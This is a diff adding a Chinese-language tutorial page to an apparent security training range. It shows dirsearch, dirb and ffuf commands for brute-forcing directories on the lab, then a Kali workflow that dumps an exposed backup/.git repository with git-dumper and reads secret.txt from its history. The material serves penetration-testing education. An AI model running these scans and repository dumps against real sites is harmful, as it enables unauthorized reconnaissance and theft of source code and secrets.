@@ -1,0 +1,44 @@
+<h4>dirsearch （推荐）</h4>
+<p>Python 编写，速度快、支持多格式输出、有过滤功能。</p>
+<pre>
+# 基本扫描（Kali 自带）
+dirsearch -u <?php echo site_base_url(); ?>/ -w /usr/share/wordlists/dirb/common.txt -e php,txt,sql,zip,bak
+
+# 使用靶场自带字典（更精准）
+dirsearch -u <?php echo site_base_url(); ?>/ -w dict_dirs.txt -e php,txt,sql,zip,bak
+</pre>
+<p>本靶场实测：48 条字典，25 个线程，<b>1.3 秒扫完</b>，全部目标命中。</p>
+
+<h4>dirb</h4>
+<p>C 编写，Kali 原生自带，速度稍慢但兼容性好。</p>
+<pre>
+# 基本用法
+dirb <?php echo site_base_url(); ?>/ /usr/share/wordlists/dirb/common.txt -X .php
+
+# 使用靶场字典
+dirb <?php echo site_base_url(); ?>/ dict_dirs.txt -w 3
+</pre>
+<p>本靶场实测：common.txt + .php 扩展约 4612 条，约 3 分钟跑完。</p>
+
+<h4>补充工具</h4>
+<ul>
+<li><b>ffuf</b>（Go 编写，速度极快）：<code>ffuf -u "<?php echo site_base_url(); ?>/FUZZ" -w dict_dirs.txt -e .php,.txt,.sql</code></li>
+<li><b>GitHack / git-dumper</b>：扫到 <code>backup/.git/</code> 后拖下整个仓库还原源码与提交历史。</li>
+<li><b>Burp Pro + Active Scan</b>：Burp 自带目录扫描器，适合在抓包过程中顺手扫。</li>
+</ul>
+
+<h4>Kali 实战流程</h4>
+<pre>
+# Kali 虚拟机：192.168.142.162
+# 靶场地址：http://192.168.142.1/bafanglab
+
+# 1. 先下载靶场自带字典
+curl -s "<?php echo BASE_URL; ?>/includes/dict_download.php?type=dirs" -o dict_dirs.txt
+
+# 2. dirsearch 扫描
+dirsearch -u <?php echo site_base_url(); ?>/ -w dict_dirs.txt -e php,txt,sql,zip,bak
+
+# 3. 扫到 backup/.git 后，用 git-dumper 拖下仓库
+git-dumper <?php echo site_base_url(); ?>/backup/.git/ ./git_dump
+cd git_dump && git log --oneline && git show HEAD~1:secret.txt
+</pre>
